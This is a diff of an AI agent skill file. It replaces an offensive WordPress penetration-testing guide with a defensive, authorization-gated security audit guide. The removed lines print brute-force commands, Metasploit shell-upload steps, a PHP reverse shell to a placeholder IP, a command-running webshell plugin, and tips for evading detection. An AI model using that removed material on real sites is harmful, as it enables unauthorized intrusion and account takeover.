@@ -1,482 +1,199 @@
 ---
-name: WordPress Penetration Testing
-description: This skill should be used when the user asks to "pentest WordPress sites", "scan WordPress for vulnerabilities", "enumerate WordPress users, themes, or plugins", "exploit WordPress vulnerabilities", or "use WPScan". It provides comprehensive WordPress security assessment methodologies.
+name: WordPress Security Audit
+description: This skill should be used when the user asks to audit, harden, or review the security posture of a WordPress site they own or are explicitly authorized to assess. Focus on defensive checks, misconfiguration discovery, patch guidance, and remediation planning.
 ---
 
-# WordPress Penetration Testing
+# WordPress Security Audit
 
 ## Purpose
 
-Conduct comprehensive security assessments of WordPress installations including enumeration of users, themes, and plugins, vulnerability scanning, credential attacks, and exploitation techniques. WordPress powers approximately 35% of websites, making it a critical target for security testing.
+Perform a defensive security assessment of WordPress installations with explicit authorization. The goal is to identify misconfigurations, outdated components, and risky settings, then provide prioritized remediation guidance.
+
+This skill does not include exploitation, credential attacks, or bypass techniques.
+
+## Authorization and Safety Gate
+
+Before any assessment, confirm and document:
+- The tester has written authorization.
+- Target scope (domains, environments, dates).
+- Allowed test intensity (passive or standard active checks).
+- Explicitly out-of-scope actions (credential stuffing, brute-force, exploit attempts, data exfiltration).
+
+If authorization is missing or unclear, stop and request clarification.
 
 ## Prerequisites
 
 ### Required Tools
-- WPScan (pre-installed in Kali Linux)
-- Metasploit Framework
-- Burp Suite or OWASP ZAP
-- Nmap for initial discovery
-- cURL or wget
+- WPScan (defensive usage only)
+- WP-CLI (for owned/self-hosted environments)
+- cURL
+- Nmap (safe service discovery only)
 
-### Required Knowledge
-- WordPress architecture and structure
-- Web application testing fundamentals
-- HTTP protocol understanding
-- Common web vulnerabilities (OWASP Top 10)
+### Required Access
+- Target URL (production/staging)
+- Optional WordPress admin access for verification
+- Optional server/hosting access for hardening changes
 
-## Outputs and Deliverables
+## Deliverables
 
-1. **WordPress Enumeration Report** - Version, themes, plugins, users
-2. **Vulnerability Assessment** - Identified CVEs and misconfigurations
-3. **Credential Assessment** - Weak password findings
-4. **Exploitation Proof** - Shell access documentation
+1. Security posture summary (high/medium/low risk areas)
+2. Findings table with severity and evidence
+3. Remediation plan with owners and target dates
+4. Re-test checklist and pass/fail closure criteria
 
-## Core Workflow
+## Workflow
 
-### Phase 1: WordPress Discovery
+### Phase 1: Scope and Baseline
 
-Identify WordPress installations:
+Collect baseline information:
 
 ```bash
-# Check for WordPress indicators
-curl -s http://target.com | grep -i wordpress
-curl -s http://target.com | grep -i "wp-content"
-curl -s http://target.com | grep -i "wp-includes"
+# Service discovery (safe)
+nmap -Pn -p 80,443 target.com
 
-# Check common WordPress paths
-curl -I http://target.com/wp-login.php
-curl -I http://target.com/wp-admin/
-curl -I http://target.com/wp-content/
-curl -I http://target.com/xmlrpc.php
-
-# Check meta generator tag
-curl -s http://target.com | grep "generator"
-
-# Nmap WordPress detection
-nmap -p 80,443 --script http-wordpress-enum target.com
+# Basic HTTP metadata
+curl -I https://target.com
+curl -s https://target.com | head -n 80
 ```
 
-Key WordPress files and directories:
-- `/wp-admin/` - Admin dashboard
-- `/wp-login.php` - Login page
-- `/wp-content/` - Themes, plugins, uploads
-- `/wp-includes/` - Core files
-- `/xmlrpc.php` - XML-RPC interface
-- `/wp-config.php` - Configuration (not accessible if secure)
-- `/readme.html` - Version information
+Validate:
+- HTTPS is enabled and certificates are valid.
+- Site responds with expected domain and redirects correctly.
+- No accidental staging/debug banners on public pages.
 
-### Phase 2: Basic WPScan Enumeration
+### Phase 2: WordPress Exposure Review
 
-Comprehensive WordPress scanning with WPScan:
+Check common endpoints and exposure level:
 
 ```bash
-# Basic scan
-wpscan --url http://target.com/wordpress/
-
-# With API token (for vulnerability data)
-wpscan --url http://target.com --api-token YOUR_API_TOKEN
-
-# Aggressive detection mode
-wpscan --url http://target.com --detection-mode aggressive
-
-# Output to file
-wpscan --url http://target.com -o results.txt
-
-# JSON output
-wpscan --url http://target.com -f json -o results.json
-
-# Verbose output
-wpscan --url http://target.com -v
+curl -I https://target.com/wp-login.php
+curl -I https://target.com/wp-admin/
+curl -I https://target.com/xmlrpc.php
+curl -I https://target.com/wp-json/
 ```
 
-### Phase 3: WordPress Version Detection
+Assess:
+- Whether `xmlrpc.php` is intentionally enabled.
+- Whether REST API exposure matches business requirements.
+- Whether login endpoints are protected (rate limiting/WAF/challenge).
 
-Identify WordPress version:
+### Phase 3: Version and Component Hygiene
+
+Run non-destructive scans and inventory collection:
 
 ```bash
-# WPScan version detection
-wpscan --url http://target.com
+# Passive/default defensive scan
+wpscan --url https://target.com --detection-mode passive
 
-# Manual version checks
-curl -s http://target.com/readme.html | grep -i version
-curl -s http://target.com/feed/ | grep -i generator
-curl -s http://target.com | grep "?ver="
-
-# Check meta generator
-curl -s http://target.com | grep 'name="generator"'
-
-# Check RSS feeds
-curl -s http://target.com/feed/
-curl -s http://target.com/comments/feed/
+# Vulnerable components focus (no credential attacks)
+wpscan --url https://target.com -e vp,vt --detection-mode passive
 ```
 
-Version sources:
-- Meta generator tag in HTML
-- readme.html file
-- RSS/Atom feeds
-- JavaScript/CSS file versions
-
-### Phase 4: Theme Enumeration
-
-Identify installed themes:
+If self-hosted access exists:
 
 ```bash
-# Enumerate all themes
-wpscan --url http://target.com -e at
-
-# Enumerate vulnerable themes only
-wpscan --url http://target.com -e vt
-
-# Theme enumeration with detection mode
-wpscan --url http://target.com -e at --plugins-detection aggressive
-
-# Manual theme detection
-curl -s http://target.com | grep "wp-content/themes/"
-curl -s http://target.com/wp-content/themes/
+wp core version
+wp plugin list --format=table
+wp theme list --format=table
 ```
 
-Theme vulnerability checks:
-```bash
-# Search for theme exploits
-searchsploit wordpress theme <theme_name>
+Assess:
+- WordPress core currency.
+- Plugin/theme update status.
+- Unsupported/abandoned components.
 
-# Check theme version
-curl -s http://target.com/wp-content/themes/<theme>/style.css | grep -i version
-curl -s http://target.com/wp-content/themes/<theme>/readme.txt
-```
+### Phase 4: Configuration and Hardening Checks
 
-### Phase 5: Plugin Enumeration
+Verify key controls:
+- `DISALLOW_FILE_EDIT` set to true in production.
+- Debug disabled in production (`WP_DEBUG`, `WP_DEBUG_DISPLAY`).
+- Correct file permissions for WordPress directories/files.
+- Directory listing disabled.
+- Security headers present (`X-Content-Type-Options`, `Referrer-Policy`, HSTS where appropriate).
+- Principle of least privilege for admin accounts.
+- 2FA enabled for privileged accounts.
+- Regular backups with restore testing.
 
-Identify installed plugins:
+Example checks:
 
 ```bash
-# Enumerate all plugins
-wpscan --url http://target.com -e ap
+# Header quick check
+curl -I https://target.com
 
-# Enumerate vulnerable plugins only
-wpscan --url http://target.com -e vp
-
-# Aggressive plugin detection
-wpscan --url http://target.com -e ap --plugins-detection aggressive
-
-# Mixed detection mode
-wpscan --url http://target.com -e ap --plugins-detection mixed
-
-# Manual plugin discovery
-curl -s http://target.com | grep "wp-content/plugins/"
-curl -s http://target.com/wp-content/plugins/
+# Directory listing spot-check
+curl -s https://target.com/wp-content/uploads/ | head -n 40
 ```
 
-Common vulnerable plugins to check:
-```bash
-# Search for plugin exploits
-searchsploit wordpress plugin <plugin_name>
-searchsploit wordpress mail-masta
-searchsploit wordpress slideshow gallery
-searchsploit wordpress reflex gallery
+### Phase 5: Authentication and Access Controls
 
-# Check plugin version
-curl -s http://target.com/wp-content/plugins/<plugin>/readme.txt
+Review only defensive posture (no brute force):
+- Login lockout/rate limit controls are active.
+- Strong password policy and MFA enforcement exist.
+- Admin usernames are non-default and limited.
+- Dormant privileged accounts are removed.
+
+### Phase 6: Data Protection and Privacy
+
+Check:
+- Sensitive files are not publicly exposed (backups, old exports, debug logs).
+- Public uploads policy is controlled.
+- PII handling aligns with policy and legal obligations.
+- Error messages do not leak stack traces or secrets.
+
+### Phase 7: Reporting and Remediation Plan
+
+Produce a findings report with:
+- ID, title, severity, evidence, impact, remediation, owner, due date.
+- Priority order: critical internet-facing issues first.
+- Clear retest steps per finding.
+
+## Severity Model
+
+- Critical: immediate compromise risk or active exploit path.
+- High: significant security weakness with realistic abuse path.
+- Medium: meaningful weakness requiring planned remediation.
+- Low: hardening/defense-in-depth gap.
+- Informational: context, no direct risk.
+
+## Findings Template
+
+Use this format for each finding:
+
+```text
+ID:
+Title:
+Severity:
+Asset:
+Evidence:
+Risk:
+Remediation:
+Owner:
+Target Date:
+Retest Steps:
+Status:
 ```
 
-### Phase 6: User Enumeration
+## Acceptance Criteria for Closure
 
-Discover WordPress users:
+A security review is considered complete when:
+- All Critical/High findings are remediated or formally risk-accepted.
+- Remediation evidence is attached.
+- Re-test confirms fixes are effective.
+- Remaining Medium/Low items have scheduled owners and dates.
 
-```bash
-# WPScan user enumeration
-wpscan --url http://target.com -e u
+## Constraints
 
-# Enumerate specific number of users
-wpscan --url http://target.com -e u1-100
+- No exploitation instructions.
+- No credential attacks.
+- No denial-of-service style testing.
+- No actions outside explicit authorization scope.
 
-# Author ID enumeration (manual)
-for i in {1..20}; do
-    curl -s "http://target.com/?author=$i" | grep -o 'author/[^/]*/'
-done
-
-# JSON API user enumeration (if enabled)
-curl -s http://target.com/wp-json/wp/v2/users
-
-# REST API user enumeration
-curl -s http://target.com/wp-json/wp/v2/users?per_page=100
-
-# Login error enumeration
-curl -X POST -d "log=admin&pwd=wrongpass" http://target.com/wp-login.php
-```
-
-### Phase 7: Comprehensive Enumeration
-
-Run all enumeration modules:
-
-```bash
-# Enumerate everything
-wpscan --url http://target.com -e at -e ap -e u
-
-# Alternative comprehensive scan
-wpscan --url http://target.com -e vp,vt,u,cb,dbe
-
-# Enumeration flags:
-# at - All themes
-# vt - Vulnerable themes
-# ap - All plugins
-# vp - Vulnerable plugins
-# u  - Users (1-10)
-# cb - Config backups
-# dbe - Database exports
-
-# Full aggressive enumeration
-wpscan --url http://target.com -e at,ap,u,cb,dbe \
-    --detection-mode aggressive \
-    --plugins-detection aggressive
-```
-
-### Phase 8: Password Attacks
-
-Brute-force WordPress credentials:
+## Quick Start (Defensive)
 
 ```bash
-# Single user brute-force
-wpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt
-
-# Multiple users from file
-wpscan --url http://target.com -U users.txt -P /usr/share/wordlists/rockyou.txt
-
-# With password attack threads
-wpscan --url http://target.com -U admin -P passwords.txt --password-attack wp-login -t 50
-
-# XML-RPC brute-force (faster, may bypass protection)
-wpscan --url http://target.com -U admin -P passwords.txt --password-attack xmlrpc
-
-# Brute-force with API limiting
-wpscan --url http://target.com -U admin -P passwords.txt --throttle 500
-
-# Create targeted wordlist
-cewl http://target.com -w wordlist.txt
-wpscan --url http://target.com -U admin -P wordlist.txt
+wpscan --url https://target.com --detection-mode passive
+wpscan --url https://target.com -e vp,vt --detection-mode passive
+curl -I https://target.com
+curl -I https://target.com/xmlrpc.php
+curl -I https://target.com/wp-json/
 ```
-
-Password attack methods:
-- `wp-login` - Standard login form
-- `xmlrpc` - XML-RPC multicall (faster)
-- `xmlrpc-multicall` - Multiple passwords per request
-
-### Phase 9: Vulnerability Exploitation
-
-#### Metasploit Shell Upload
-
-After obtaining credentials:
-
-```bash
-# Start Metasploit
-msfconsole
-
-# Admin shell upload
-use exploit/unix/webapp/wp_admin_shell_upload
-set RHOSTS target.com
-set USERNAME admin
-set PASSWORD jessica
-set TARGETURI /wordpress
-set LHOST <your_ip>
-exploit
-```
-
-#### Plugin Exploitation
-
-```bash
-# Slideshow Gallery exploit
-use exploit/unix/webapp/wp_slideshowgallery_upload
-set RHOSTS target.com
-set TARGETURI /wordpress
-set USERNAME admin
-set PASSWORD jessica
-set LHOST <your_ip>
-exploit
-
-# Search for WordPress exploits
-search type:exploit platform:php wordpress
-```
-
-#### Manual Exploitation
-
-Theme/plugin editor (with admin access):
-
-```php
-// Navigate to Appearance > Theme Editor
-// Edit 404.php or functions.php
-// Add PHP reverse shell:
-
-<?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'");
-?>
-
-// Or use weevely backdoor
-// Access via: http://target.com/wp-content/themes/theme_name/404.php
-```
-
-Plugin upload method:
-
-```bash
-# Create malicious plugin
-cat > malicious.php << 'EOF'
-<?php
-/*
-Plugin Name: Malicious Plugin
-Description: Security Testing
-Version: 1.0
-*/
-if(isset($_GET['cmd'])){
-    system($_GET['cmd']);
-}
-?>
-EOF
-
-# Zip and upload via Plugins > Add New > Upload Plugin
-zip malicious.zip malicious.php
-
-# Access webshell
-curl "http://target.com/wp-content/plugins/malicious/malicious.php?cmd=id"
-```
-
-### Phase 10: Advanced Techniques
-
-#### XML-RPC Exploitation
-
-```bash
-# Check if XML-RPC is enabled
-curl -X POST http://target.com/xmlrpc.php
-
-# List available methods
-curl -X POST -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' http://target.com/xmlrpc.php
-
-# Brute-force via XML-RPC multicall
-cat > xmlrpc_brute.xml << 'EOF'
-<?xml version="1.0"?>
-<methodCall>
-<methodName>system.multicall</methodName>
-<params>
-<param><value><array><data>
-<value><struct>
-<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
-<member><name>params</name><value><array><data>
-<value><string>admin</string></value>
-<value><string>password1</string></value>
-</data></array></value></member>
-</struct></value>
-<value><struct>
-<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
-<member><name>params</name><value><array><data>
-<value><string>admin</string></value>
-<value><string>password2</string></value>
-</data></array></value></member>
-</struct></value>
-</data></array></value></param>
-</params>
-</methodCall>
-EOF
-
-curl -X POST -d @xmlrpc_brute.xml http://target.com/xmlrpc.php
-```
-
-#### Scanning Through Proxy
-
-```bash
-# Use Tor proxy
-wpscan --url http://target.com --proxy socks5://127.0.0.1:9050
-
-# HTTP proxy
-wpscan --url http://target.com --proxy http://127.0.0.1:8080
-
-# Burp Suite proxy
-wpscan --url http://target.com --proxy http://127.0.0.1:8080 --disable-tls-checks
-```
-
-#### HTTP Authentication
-
-```bash
-# Basic authentication
-wpscan --url http://target.com --http-auth admin:password
-
-# Force SSL/TLS
-wpscan --url https://target.com --disable-tls-checks
-```
-
-## Quick Reference
-
-### WPScan Enumeration Flags
-
-| Flag | Description |
-|------|-------------|
-| `-e at` | All themes |
-| `-e vt` | Vulnerable themes |
-| `-e ap` | All plugins |
-| `-e vp` | Vulnerable plugins |
-| `-e u` | Users (1-10) |
-| `-e cb` | Config backups |
-| `-e dbe` | Database exports |
-
-### Common WordPress Paths
-
-| Path | Purpose |
-|------|---------|
-| `/wp-admin/` | Admin dashboard |
-| `/wp-login.php` | Login page |
-| `/wp-content/uploads/` | User uploads |
-| `/wp-includes/` | Core files |
-| `/xmlrpc.php` | XML-RPC API |
-| `/wp-json/` | REST API |
-
-### WPScan Command Examples
-
-| Purpose | Command |
-|---------|---------|
-| Basic scan | `wpscan --url http://target.com` |
-| All enumeration | `wpscan --url http://target.com -e at,ap,u` |
-| Password attack | `wpscan --url http://target.com -U admin -P pass.txt` |
-| Aggressive | `wpscan --url http://target.com --detection-mode aggressive` |
-
-## Constraints and Limitations
-
-### Legal Considerations
-- Obtain written authorization before testing
-- Stay within defined scope
-- Document all testing activities
-- Follow responsible disclosure
-
-### Technical Limitations
-- WAF may block scanning
-- Rate limiting may prevent brute-force
-- Some plugins may have false negatives
-- XML-RPC may be disabled
-
-### Detection Evasion
-- Use random user agents: `--random-user-agent`
-- Throttle requests: `--throttle 1000`
-- Use proxy rotation
-- Avoid aggressive modes on monitored sites
-
-## Troubleshooting
-
-### WPScan Shows No Vulnerabilities
-
-**Solutions:**
-1. Use API token for vulnerability database
-2. Try aggressive detection mode
-3. Check for WAF blocking scans
-4. Verify WordPress is actually installed
-
-### Brute-Force Blocked
-
-**Solutions:**
-1. Use XML-RPC method instead of wp-login
-2. Add throttling: `--throttle 500`
-3. Use different user agents
-4. Check for IP blocking/fail2ban
-
-### Cannot Access Admin Panel
-
-**Solutions:**
-1. Verify credentials are correct
-2. Check for two-factor authentication
-3. Look for IP whitelist restrictions
-4. Check for login URL changes (security plugins)
